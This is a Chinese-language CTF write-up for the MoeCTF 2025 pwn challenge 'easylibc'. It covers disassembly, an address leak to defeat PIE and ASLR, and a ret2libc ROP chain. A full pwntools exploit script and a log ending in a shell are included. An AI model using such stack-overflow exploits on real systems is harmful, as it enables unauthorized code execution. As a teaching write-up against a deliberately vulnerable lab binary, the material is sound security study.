---
title: 'XiDianCTF MoeCTF 2025 PWN Easylibc'
date: '2026-09-06T10:32:36+08:00'
lastmod: '2026-09-06T10:32:36+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "Pwn"
---

```
本文为人工撰写，仅使用生成式AI校对。
```

[题目链接](https://ctf.xidian.edu.cn/training/22?challenge=895)

这次我们改成`checksec`起手。

| RELRO         | STACK CANARY    | NX         | PIE         | RPATH    | RUNPATH    | Symbols    | FORTIFY | Fortified | Fortifiable | FILE |
| :------------ | :-------------- | :--------- | :---------- | :------- | :--------- | :--------- | :------ | :-------- | :---------- | :--- |
| Partial RELRO | No canary found | NX enabled | PIE enabled | No RPATH | No RUNPATH | 41 Symbols | No      | 0         | 2           | pwn  |

> 注意到`PIE`开启，并且由题目提示`ASLR`也一同启用。

所以我们需要找到基址。



还是IDA。

```assembly
.text:00000000000011CE ; =============== S U B R O U T I N E =======================================
.text:00000000000011CE
.text:00000000000011CE ; Attributes: bp-based frame
.text:00000000000011CE
.text:00000000000011CE ; int __fastcall main(int argc, const char **argv, const char **envp)
.text:00000000000011CE                 public main
.text:00000000000011CE main            proc near               ; DATA XREF: _start+18↑o
.text:00000000000011CE
.text:00000000000011CE var_8           = qword ptr -8
.text:00000000000011CE
.text:00000000000011CE ; __unwind {
.text:00000000000011CE                 endbr64
.text:00000000000011D2                 push    rbp
.text:00000000000011D3                 mov     rbp, rsp
.text:00000000000011D6                 sub     rsp, 10h
.text:00000000000011DA                 mov     rax, cs:__bss_start
.text:00000000000011E1                 mov     esi, 0          ; buf
.text:00000000000011E6                 mov     rdi, rax        ; stream
.text:00000000000011E9                 call    _setbuf
.text:00000000000011EE                 lea     rax, off_4030  <------这里
.text:00000000000011F5                 mov     [rbp+var_8], rax
.text:00000000000011F9                 mov     rax, [rbp+var_8]
.text:00000000000011FD                 mov     rax, [rax]
.text:0000000000001200                 mov     rsi, rax
.text:0000000000001203                 lea     rax, format     ; "What is this?\nHow can I use %p without"...
.text:000000000000120A                 mov     rdi, rax        ; format
.text:000000000000120D                 mov     eax, 0
.text:0000000000001212                 call    _printf
.text:0000000000001217                 mov     eax, 0
.text:000000000000121C                 call    vuln
.text:0000000000001221                 lea     rax, s          ; "Something happening"
.text:0000000000001228                 mov     rdi, rax        ; s
.text:000000000000122B                 call    _puts
.text:0000000000001230                 mov     eax, 0
.text:0000000000001235                 leave
.text:0000000000001236                 retn
.text:0000000000001236 ; } // starts at 11CE
.text:0000000000001236 main            endp
.text:0000000000001236
.text:0000000000001236 _text           ends
.text:0000000000001236
```

注意到`.text:00000000000011EE  lea     rax, off_4030`，跳转到`off_4030`处。

```assembly
got.plt:0000000000004000 ; ===========================================================================
.got.plt:0000000000004000
.got.plt:0000000000004000 ; Segment type: Pure data
.got.plt:0000000000004000 ; Segment permissions: Read/Write
.got.plt:0000000000004000 _got_plt        segment qword public 'DATA' use64
.got.plt:0000000000004000                 assume cs:_got_plt
.got.plt:0000000000004000                 ;org 4000h
.got.plt:0000000000004000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:0000000000004008 qword_4008      dq 0                    ; DATA XREF: sub_1020↑r
.got.plt:0000000000004010 qword_4010      dq 0                    ; DATA XREF: sub_1020+6↑r
.got.plt:0000000000004018 off_4018        dq offset puts          ; DATA XREF: _puts+4↑r
.got.plt:0000000000004020 off_4020        dq offset setbuf        ; DATA XREF: _setbuf+4↑r
.got.plt:0000000000004028 off_4028        dq offset printf        ; DATA XREF: _printf+4↑r
.got.plt:0000000000004030 off_4030        dq offset read          ; DATA XREF: _read+4↑r
.got.plt:0000000000004030                                         ; main+20↑o
.got.plt:0000000000004030 _got_plt        ends
.got.plt:0000000000004030
```

注意到这是`read()`在`GOT`表中指向的地址。

首次调用之前指向`.plt`中`endbr64`的地址，调用后指向目标函数的真实运行地址。

所以我们需要调用一次`read()`后才能得到真实的地址从而算出`libc.so.6`基址。



这里还有一个坑，开启`PIE`后我们需要使用基址+偏移来跳转，我们可以使用首次读到的地址和`.plt`的地址来计算。

使用炫酷的`pwndbg`调试。

```
pwndbg> piebase
Calculated VA from /path/to/pwn = 0x555555554000
```

得到运行时基址。

在`main()`打断点，得到`main()`的运行地址`0x5555 5555 51B0`，步进到

```assembly
0x5555555551fd <main+47>    mov    rax, qword ptr [rax] 
```

此时`$RSI`为`0x555555555060`。反编译该地址。

```assembly
   0x55555555504f                                          ▲▲▲    nop
   0x555555555050                                          ╎╎╎    endbr64
   0x555555555054                                          ╎╎╎    push   2
   0x555555555059                                          ╎╎└<   bnd jmp 0x555555555020             <0x555555555020>
                                                           ╎╎
   0x55555555505f                                          ╎╎     nop
 ► 0x555555555060                                          ╎╎     endbr64
   0x555555555064                                          ╎╎     push   3
   0x555555555069                                          ╎└─<   bnd jmp 0x555555555020             <0x555555555020>
                                                           ╎
   0x55555555506f                                          ╎      nop
   0x555555555070 <__cxa_finalize@plt>                     ╎      endbr64
   0x555555555074 <__cxa_finalize@plt+4>                   ╎ ┌<   bnd jmp qword ptr [rip + 0x2f7d]   <__cxa_finalize>
                                                           ╎ │
   0x55555555507b <__cxa_finalize@plt+11>                  ╎ │    nop    dword ptr [rax + rax]
   0x555555555080 <puts@plt>                               ╎ │    endbr64
   0x555555555084 <puts@plt+4>                             └──<   bnd jmp qword ptr [rip + 0x2f8d]   <[puts@got[plt]], now=0x555555555030>
                                                             │
   0x55555555508b <puts@plt+11>                              │    nop    dword ptr [rax + rax]
```

注意到这里看起来像是`.plt`节。

该地址偏移为固定值，距离基址的偏移为`0x555555555060 - 0x555555554000 = 0x1060`。



查看`vuln()`函数。

```c
ssize_t vuln()
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  return read(0, buf, 0x60uLL);
}
```

所以我们应该先劫持ret到`lea     rax, off_4030`使其得到真正运行地址并输出后再次利用`vuln()`栈溢出并利用`libc`获取`shell`。



得到。

```assembly
.rodata:00000000001D8678 aBinSh          db '/bin/sh',0          ; DATA XREF: sub_50900+173↑o
```

```assembly
0x000000000002a3e5 : pop rdi ; ret
```



第一次跳转回`main()`的过程还有坑。

我们想要跳转到`0x11EE`直接从lea开始。

但是经测试程序会挂掉。

因为后面使用`$RBP+偏移`寻址，直接把`$RBP`覆盖为`b'A'`会导致程序错误。

 所以我们可以使用函数头部的`mov rbp rsp`还原栈，或者让`$RBP`定位到以一个可写的区域。





构建pwntools脚本:

```python
from pwn import *
import ctypes
context(arch='amd64', os='linux', log_level='debug')

io = connect("127.0.0.1", 52243)



io.recvuntil(b"use")
pltAdd = int(io.recvn(16), 16)
print(hex(pltAdd))
baseAdd = pltAdd - 0x1060
print(hex(baseAdd))

io.sendline(b'A' * 32 + b'A' * 8 + p64(baseAdd + 0x11d3))


io.recvuntil(b"use")
libcAdd = int(io.recv(16), 16)
print(hex(libcAdd))
libcBaseAdd = libcAdd - 0x1147D0

gadgetAdd = libcBaseAdd + 0x2A3E5
stringAdd = libcBaseAdd + 0x1D8678
systemAdd = libcBaseAdd + 0x50D70
retAdd = libcBaseAdd + 0x2a3e6

io.sendline(b'A' * (32 + 8) + p64(retAdd) + p64(gadgetAdd) + p64(stringAdd) + p64(systemAdd))

io.interactive()
```

输出:

```
[x] Opening connection to 127.0.0.1 on port 52243
[x] Opening connection to 127.0.0.1 on port 52243: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 52243: Done
[DEBUG] Received 0x45 bytes:
    b'What is this?\n'
    b'How can I use 0x562e54ae5060 without a backdoor? Damn!\n'
0x562e54ae5060
0x562e54ae4000
[DEBUG] Sent 0x31 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  d3 51 ae 54  2e 56 00 00  │AAAA│AAAA│·Q·T│.V··│
    00000030  0a                                                  │·│
    00000031
[DEBUG] Received 0x45 bytes:
    b'What is this?\n'
    b'How can I use 0x7f5410f147d0 without a backdoor? Damn!\n'
0x7f5410f147d0
[DEBUG] Sent 0x49 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  e6 a3 e2 10  54 7f 00 00  │AAAA│AAAA│····│T···│
    00000030  e5 a3 e2 10  54 7f 00 00  78 86 fd 10  54 7f 00 00  │····│T···│x···│T···│
    00000040  70 0d e5 10  54 7f 00 00  0a                        │p···│T···│·│
    00000049
[*] Switching to interactive mode
without a backdoor? Damn!
ls
[DEBUG] Sent 0x1 bytes:
    b'l'
[DEBUG] Sent 0x1 bytes:
    b's'
[DEBUG] Sent 0x1 bytes:
    b'\n'
[DEBUG] Received ...
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
cat flag
[DEBUG] Sent ...
[DEBUG] Received ...
moectf{THIS_IS_FLAG}
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 52243
```









